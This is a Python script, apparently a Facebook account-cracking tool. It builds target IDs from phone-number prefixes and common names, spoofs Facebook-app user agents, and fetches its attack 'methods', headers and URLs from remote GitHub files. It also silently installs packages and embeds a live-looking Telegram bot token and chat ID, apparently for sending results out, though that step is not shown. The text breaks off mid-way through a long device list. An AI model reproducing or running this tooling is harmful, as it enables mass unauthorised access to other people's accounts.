import os
import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
from bs4 import BeautifulSoup
from io import BytesIO
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install pycurl')
try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')
#━━━━[ COLORS ]━━━━#
###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
my_color = [
 P, M, H, K, B, U, N, R, Y,]
###----------[ CONVERT LINE ]----------###
led = f'{M} -{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}-{M}{M}-{M}-{M}-{H}-{M}'
###----------[ BANNER MENUH ]----------###
gen=f' {K}[{GREEN}√{K}] {P}'
dot=f' {K}[{GREEN}•{K}] {P}'
rdd=f' {K}[{RED}•{K}] {P}'
rgen=f' {K}[{RED}√{K}] {P}'
wt=f' {K}[{GREEN}?{K}] {P}'
rong=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong2=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong3=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong4=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong5=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong6=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
rong7=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m'])
fst=f'{dot}[{H}sumon{M}-{H}milon{M}-{H}bithika{M}-{H}sakshi{M}-{H}mimi{P}]'
lst=f'{dot}[{H}roy{M}-{H}sarkar{M}-{H}biswas{M}-{H}das{M}-{H}khan{P}]'
limitt=f'{dot}[{H}5000{M}-{H}10000{M}-{H}15000{M}-{H}20000{M}-{H}50000{P}]'
c7=f'{dot}[{H}7679{M}-{H}9832{M}-{H}6297{M}-{H}9987{M}-{H}8817{M}-{H}7209{P}]'
c6=f'{dot}[{H}01778{M}-{H}01991{M}-{H}01661{M}-{H}01776{M}-{H}01996{M}-{H}01779{P}]'
c8=f'{dot}[{H}017{M}-{H}019{M}-{H}016{M}-{H}013{M}-{H}018{M}-{H}014{M}-{H}015{P}]'
mtd,cp_xdx,cokix=[],[],[]
token = ('7298092968:AAEq1r1c0O4xpHUl8w8tiJI4C6dhfks_gvM')
ID = ('1778046662')
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m"
loop = 0
oks = []
cps = []
id = []
ck = []
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
os.system('')
today = '\033[1;36m'+str(hari)+'\033[1;97m-\033[1;36m'+str(bulan)+'\033[1;97m-\033[1;36m'+str(tahun)
#--------------------------------[METHOD 1]--------------------------------#
_method_1_buffer = BytesIO()
_method_1_curl = pycurl.Curl()
_method_1_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot1.txt')
_method_1_curl.setopt(pycurl.WRITEDATA, _method_1_buffer)
_method_1_curl.perform()
_method_1_data = _method_1_buffer.getvalue().decode('utf-8').splitlines()
def mls1():
    END = ''.join(_method_1_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 2]--------------------------------#
_method_2_buffer = BytesIO()
_method_2_curl = pycurl.Curl()
_method_2_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot2.txt')
_method_2_curl.setopt(pycurl.WRITEDATA, _method_2_buffer)
_method_2_curl.perform()
_method_2_data = _method_2_buffer.getvalue().decode('utf-8').splitlines()
def mls2():
    END = ''.join(_method_2_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 3]--------------------------------#
_method_3_buffer = BytesIO()
_method_3_curl = pycurl.Curl()
_method_3_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot3.txt')
_method_3_curl.setopt(pycurl.WRITEDATA, _method_3_buffer)
_method_3_curl.perform()
_method_3_data = _method_3_buffer.getvalue().decode('utf-8').splitlines()
def mls3():
    END = ''.join(_method_3_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 4]--------------------------------#
_method_4_buffer = BytesIO()
_method_4_curl = pycurl.Curl()
_method_4_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot4.txt')
_method_4_curl.setopt(pycurl.WRITEDATA, _method_4_buffer)
_method_4_curl.perform()
_method_4_data = _method_4_buffer.getvalue().decode('utf-8').splitlines()
def mls4():
    END = ''.join(_method_4_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 5]--------------------------------#
_method_5_buffer = BytesIO()
_method_5_curl = pycurl.Curl()
_method_5_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot5.txt')
_method_5_curl.setopt(pycurl.WRITEDATA, _method_5_buffer)
_method_5_curl.perform()
_method_5_data = _method_5_buffer.getvalue().decode('utf-8').splitlines()
def mls5():
    END = ''.join(_method_5_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[METHOD 6]--------------------------------#
_method_6_buffer = BytesIO()
_method_6_curl = pycurl.Curl()
_method_6_curl.setopt(pycurl.URL, 'https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Mathot6.txt')
_method_6_curl.setopt(pycurl.WRITEDATA, _method_6_buffer)
_method_6_curl.perform()
_method_6_data = _method_6_buffer.getvalue().decode('utf-8').splitlines()
def mls6():
    END = ''.join(_method_6_data)
    ffx = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';' + END
    return ffx
#--------------------------------[NORMAL MTD]--------------------------------#
import requests,random

def ua_valid():
    rr = random.randint
    rc = random.choice
    model2 = requests.get('https://gi'+'st.githubus'+'ercontent.com/zar0-XD/c3d50589'+'d804b5b7ab5a7717a22cfe0d/raw/6937320508d'+'d57dd78d0c2'+'97d532fdc233306d01/m'+'dls.txt').text.splitlines()
    model = random.choice(model2)
    redmi4 = f"Mozilla/5.0 (Linux; Android 13; {model} Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(100,109))}.0.{str(rr(4896,5414))}.{str(rr(118,127))} Mobile Safari/537.36"
    return rc([redmi4])
#--------------------------------[VERSION CHANGE]--------
try:
    version = requests.get('https://raw.githubusercontent.com/ATONxSMILE404/Approve.txt/main/Version.txt').text
except:
    print('No Internet Connection.....');exit()
version = version.strip()
#-------------------------[RANDOM]--------
#-------------------------[METHOD 1 ]--------
try:
    DATAM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/DATA.txt').text
except:
    print('No Internet Connection.....');exit()
DATAM1 = DATAM1.strip()
try:
    HEADERSM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/HEADERS.txt').text
except:
    print('No Internet Connection.....');exit()
HEADERSM1 = HEADERSM1.strip()
try:
    URLM1 = requests.get('https://raw.githubusercontent.com/Sumon8389/METHOD1/main/URL.txt').text
except:
    print('No Internet Connection.....');exit()
URLM1 = URLM1.strip()

#----------------------------[USER/AGENT]-----------------------------------#
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    zA=random.choice(['a','b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
    rx=random.randrange(1, 999)
    xx=f"Mozilla/5.0 (Wi    ndows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
    return xx
def facebook_agent():
    android_versions = ['10', '11', '12']
    
    # List of popular Android device models
    mobile_models = [
        'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11',
        'LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3'
        # Add more models here
    ]
    
    android_version = random.choice(android_versions)
    mobile_model = random.choice(mobile_models)
    
    # Build number format TP1A.<random number>.<random number>
    build_number = f"TP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}"
    
    # Random screen density, width, and height
    density = random.choice(['1.5', '2.0', '2.5', '3.0', '4.0'])
    width = random.choice(['480', '720', '1080', '1440'])
    height = random.choice(['800', '1280', '1920', '2560'])
    
    # Random components in agent string
    agent_components = {
        'FBAV': f"{random.randint(81, 89)}.0.0.{random.randint(11, 99)}",
        'FBBV': f"{random.randint(31800000, 31999999)}",
        'FBDM': f"{{density={density},width={width},height={height}}}",
        'FBLC': 'en_US',
        'FBCR': random.choice(["Verizon", "AT&T", "T-Mobile"]),
        'FBMF': mobile_model.split(' ')[0],
        'FBBD': mobile_model.split(' ')[0],
        'FBDV': mobile_model,
        'FBSV': android_version,
        'FBOP': '1',
        'FBCA': 'arm64-v8a:armeabi-v7a'
    }
    
    # Constructing user agent string
    user_agent = f"Mozilla/5.0 (Linux; Android {android_version}; {mobile_model} Build/{build_number}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{random.randint(110, 120)}.0.0.0 Mobile Safari/537.36 ["
    
    user_agent += ';'.join([f"{key}/{value}" for key, value in agent_components.items()])
    user_agent += "]"
    
    return user_agent

def useragent_control():
    one = str(random.randint(101,303))
    two = str(random.randint(101,303))
    U_V1 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097196;FBDM/{{density=3.0,width=1080,height=1920}};FBLC/en_GB;FBCR/IND airtel;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi 4i;FBSV/5.0.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V2 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454129;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/airtel;FBMF/OnePlus;FBBD/oneplus;FBPN/com.facebook.katana;FBDV/A0001;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V3 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_GB;FBCR/Reliance;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/XT1033;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V4 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20748104;FBDM/{{density=1.5,width=540,height=960}};FBLC/en_US;FBCR/XL Axiata;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/A33w;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
    U_V5 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454026;FBDM/{{density=3.0,width=1080,height=1776}};FBLC/en_US;FBCR/T-Mobile;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-D801;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V6 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20097172;FBDM/{{density=1.5,width=540,height=960}};FBLC/sv_SE;FBCR/Telia;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9195;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
    U_V7 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748054;FBDM/{{density=2.0,width=720,height=1280}};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500Y;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
    U_V8 = f"[FBAN/FB4A;FBAV/{one}.0.0.15.{two};FBBV/20748051;FBDM/{{density=1.5,width=540,height=960}};FBLC/es_ES;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/HUAWEI G6-L11;FBSV/4.3;nullFBCA/armeabi-v7a:armeabi;]"
    U_V9 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20454115;FBDM/{{density=2.0,width=720,height=1184}};FBLC/en_US;FBCR/airtel;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/MotoG3;FBSV/6.0;nullFBCA/armeabi-v7a:armeabi;]"
    U_V10 = f"[FBAN/FB4A;FBAV/{one}.0.0.16.{two};FBBV/20453986;FBDM/{{density=1.5,width=480,height=854}};FBLC/es_LA;FBCR/;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI Y511-U251;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]"
    A_VALL = random.choice([U_V1, U_V2, U_V3, U_V4, U_V5, U_V6, U_V7, U_V8, U_V9, U_V10])
    return A_VALL

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
samsung = ['GTH896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-G284W','GT-X415Q','GT-B204S','GT-J766Z','GT-Q691H','GT-C60Y','GT-U971F','GT-D795V','GT-C75F','GT-H953D','GT-Z340I','GT-M716C','GT-B750N','GT-Y949F','GT-O324V','GT-R773B','GT-J151G','GT-C867Z','GT-H896R','GT-L397L','GT-E596V','GT-L805N','GT-Q86U','GT-M480H','GT-I892C','GT-J243N','GT-X934Z','GT-S697T','GT-K144M','GT-Z102X','GT-U114T','GT-R721S','GT-A950P','GT-B935C','GT-B383Q','GT-Z673M','GT-T764B','GT-T335G','GT-Y579H','GT-G45O','GT-L707Z','GT-X632N','GT-B479B','GT-P721P','GT-F450B','GT-S380K','GT-B179P','GT-G141W','GT-C508O','GT-C283J','GT-Z386B','GT-C379G','GT-N22C','GT-G849S','GT-S672P','GT-V30V','GT-O794W','GT-J744W','GT-L24Q','GT-K10J','GT-Z276S','GT-V277I','GT-M644L','GT-K854K','GT-K917N','GT-P840B','GT-D330N','GT-K730Z','GT-S114W','GT-X446U','GT-X127T','GT-P412L','GT-S609F','GT-L820J','GT-E958K','GT-P658E','GT-K683Q','GT-Y675S','GT-A419X','GT-Z4B','GT-K19L','GT-S297V','GT-F767D','GT-I229T','GT-Y703G','GT-A977G','GT-P646M','GT-W397S','GT-O56A','GT-F105U','GT-F555K','GT-L813T','GT-E901I','GT-B17Y','GT-P422E','GT-D702L','GT-H186Q','GT-Q777Y','GT-Z627K','GT-F388Q','GT-H89Q','GT-Q748G','GT-V529H','GT-V474B','GT-U156N','GT-A674C','GT-O265K','GT-Y352Z','GT-J384E','GT-H613M','GT-A146R','GT-F704K','GT-S248Y','GT-E247I','GT-L917P','GT-V864F','GT-X59J','GT-F452Y','GT-I492S','GT-L632K','GT-H247J','GT-W181M','GT-L906W','GT-Z326V','GT-T680G','GT-Y973D','GT-H405C','GT-F869A','GT-K683N','GT-L870U','GT-A420S','GT-A83X','GT-O724U','GT-H992S','GT-B673N','GT-Q894T','GT-A585C','GT-B222T','GT-O164M','GT-K389U','GT-X996S','GT-Q922C','GT-S856B','GT-F379L','GT-Q9O','GT-Z514E','GT-S579K','GT-G996Y','GT-B790G','GT-D517F','GT-O10Z','GT-E362Z','GT-H795U','GT-W218T','GT-M342V','GT-L509T','GT-L61V','GT-O574H','GT-M583O','GT-F59R','GT-O270G','GT-M749L','GT-A638Z','GT-B67V','GT-W751A','GT-P375U','GT-B271T','GT-F304O','GT-J180W','GT-N872W','GT-O248U','GT-H308X','GT-H664Z','GT-Z658S','GT-D465V','GT-E881Y','GT-F371M','GT-J279S','GT-L861O','GT-R565X','GT-T138J','GT-J114Y','GT-W853B','GT-J327C','GT-D75U','GT-I299O','GT-U912Z','GT-H863F','GT-O856K','GT-Y469P','GT-U359M','GT-Q996Z','GT-D755S','GT-F521O','GT-H85G','GT-H303D','GT-J241A','GT-X152M','GT-V935L','GT-L846K','GT-T650H','GT-Y257H','GT-O358U','GT-C569R','GT-C897W','GT-V713I','GT-Y205V','GT-C119U','GT-A668O','GT-V184U','GT-M460D','GT-K161S','GT-C700I','GT-S246S','GT-O263X','GT-Y563I','GT-H720B','GT-O819O','GT-P171N','GT-A945F','GT-P727S','GT-K383T','GT-O758U','GT-K104C','GT-T655K','GT-U182F','GT-V662H','GT-G739X','GT-Y443M','GT-F776S','GT-Z77E','GT-X84P','GT-E800X','GT-J274L','GT-O695Z','GT-A494K','GT-C461T','GT-B387P','GT-B431O','GT-U589G','GT-O543T','GT-D644B','GT-E310M','GT-W683Y','GT-Y271O','GT-D136Q','GT-L756D','GT-W120B','GT-U966T','GT-J860O','GT-O510A','GT-E202J','GT-U88A','GT-S868C','GT-V770Q','GT-G928S','GT-X209M','GT-X593D','GT-V735G','GT-Q40X','GT-D902G','GT-O402X','GT-B995T','GT-D975O','GT-S402F','GT-V780U','GT-N891I','GT-G665I','GT-T828A','GT-K346C','GT-I942S','GT-C794M','GT-Y145Q','GT-E972H','GT-L856H','GT-V415A','GT-J352J','GT-P661Q','GT-M862H','GT-Z989B','GT-K880R','GT-N558U','GT-Z943T','GT-Y951H','GT-C770R','GT-B191B','GT-D369F','GT-C193J','GT-G523Y','GT-D11W','GT-W587W','GT-U980J','GT-A516R','GT-N11J','GT-A888U','GT-Q220F','GT-V888B','GT-U253X','GT-R291R','GT-J78S','GT-